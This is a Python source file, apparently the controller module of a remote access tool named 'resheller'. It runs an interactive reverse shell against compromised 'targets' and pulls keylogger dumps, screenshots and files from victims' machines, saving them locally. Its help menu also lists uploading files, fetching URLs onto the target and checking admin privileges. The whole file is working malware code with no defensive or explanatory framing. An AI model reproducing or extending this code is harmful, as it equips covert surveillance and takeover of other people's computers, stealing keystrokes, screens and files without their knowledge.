#!/usr/bin/env python3
from base64 import b64decode
from os import path
from pathlib import Path
from time import strftime

from src.pipe.safe_socket import SafeSocket
from src.stdout.color import Color


class Shell:

    def __init__(self, ips, targets, sessions):
        self.ips = ips
        self.targets = targets
        self.target = targets[sessions]
        self.ip, _ = ips[sessions]
        self.time = strftime("%H.%M.%S")
        self.safe_sock = SafeSocket(self.target)
        self.windows = self.safe_sock.callback("get_os")

    @staticmethod
    def make_dir(command):
        date = strftime("%Y.%m.%d")
        main_dir = path.join(str(Path.home()), ".resheller")
        _dir = path.join(main_dir, date, command)
        if not path.isdir(_dir):
            Path(_dir).mkdir(parents=True, exist_ok=True)
        return _dir

    def keylogger_dump(self):
        _dir = self.make_dir("logs")
        log_file = path.join(_dir, f"keylog_{self.time}.txt")
        logs = self.safe_sock.recv()
        if logs[:3] == "[!]":
            print(Color(logs).b_red())
        else:
            with open(log_file, 'w') as log:
                log.write(logs)
            print(logs)
            print(Color(f"Saved {log_file}\n").grn())

    def download(self, command):
        count = 1
        _dir = self.make_dir("downloads")
        downloaded = path.join(_dir, f"{command[9:]}")
        while True:
            if path.isfile(downloaded):
                count += 1
                downloaded = f"{downloaded}_{count}"
            else:
                break
        with open(downloaded, 'wb') as file:
            payload = self.safe_sock.recv()
            file.write(b64decode(payload))
        print(Color(f'Saved {downloaded}\n').grn())

    def screenshot(self):
        _dir = self.make_dir("screenshots")
        screenshot = path.join(_dir, f"screenshot_{self.time}.png")
        payload = self.safe_sock.recv()
        image = b64decode(payload)
        if image[:3] == "[!]":
            print(Color(image).b_red())
        else:
            with open(screenshot, "wb") as shot:
                shot.write(image)
                shot.close()
            print(Color(f"Saved {screenshot}\n").grn())

    def print_stdout(self):
        stdout = self.safe_sock.recv()
        if stdout[:3] == "[+]" and len(stdout) > 3:
            stdout = Color(f"{stdout}\n").b_grn()
        elif stdout == '[+]':
            return
        elif stdout[:3] == "[!]":
            stdout = Color(f"{stdout}\n").b_red()
        print(stdout)

    def independent_path(self, *args):
        if self.windows:
            return path.join(*args).replace("/", "\\")
        else:
            return path.join(*args)

    def get_path(self):
        root = False
        request = "pwd"
        slash = "/"
        del_list = 3
        chop = 1
        if self.windows:
            request = "cd"
            slash = "\\"
            chop = 2
        stdout = self.safe_sock.callback(request)
        dir_list = stdout.split(slash)
        dir_list[-1] = dir_list[-1][:-chop]
        if dir_list[1] == "root":
            root = True
            del_list = 2
        dir_list[0] = slash
        if len(dir_list) == 1:
            return dir_list[0]
        if len(dir_list) == 2:
            if root:
                return f"~{dir_list[0]}"
            return f"{dir_list[0]}{dir_list[1]}"
        if len(dir_list) == 3:
            if root:
                return self.independent_path("~", dir_list[2])
            return f"~{dir_list[0]}"
        if len(dir_list) > 3:
            basename = dir_list.pop(-1)
            del dir_list[0:del_list]
            simplified = "~"
            count = 0
            while count < len(dir_list):
                simplified = self.independent_path(simplified, "..")
                count += 1
            return self.independent_path(simplified, basename)

    def ps1(self):
        return input(f'{Color("{").b_blu()}{Color("shell").b_red()}'
                     f'{Color("@").b_blu()}{Color(self.ip).b_red()}:'
                     f'{Color(self.get_path()).b_grn()}{Color("}>").b_blu()} ')

    @staticmethod
    def help():
        help_options = (
            "[*] Usage:\n"
            "help            --> print this help message\n"
            "download <path> --> download file from target\n"
            "upload <path>   --> upload file from target\n"
            "get <url>       --> download file from website to target\n"
            "screenshot      --> take screenshot on target\n"
            "check           --> check for admin privileges\n"
            "keylogger <opt> --> <start> --> start keylogger on target\n"
            "                    <dump>  --> retrieve logs from target\n"
            "quit            --> exit reverse shell\n"
        )
        print(Color(help_options).ylw())

    def exit_shell(self):
        self.target.close()
        self.targets.remove(self.target)
        self.ips.remove(self.ip)

    def shell(self):
        print(Color("[+] Connection Established\n").b_grn())
        while True:
            command = self.ps1()
            if command == "help":
                self.help()
                continue
            if command == "ls":
                command = "dir"
            self.safe_sock.send(command)
            if command == 'quit':
                break
            elif command == "exit":
                self.exit_shell()
                break
            elif command[:14] == "keylogger dump":
                self.keylogger_dump()
            elif command[:8] == "download":
                self.download(command)
            elif command[:10] == "screenshot":
                self.screenshot()
            else:
                self.print_stdout()
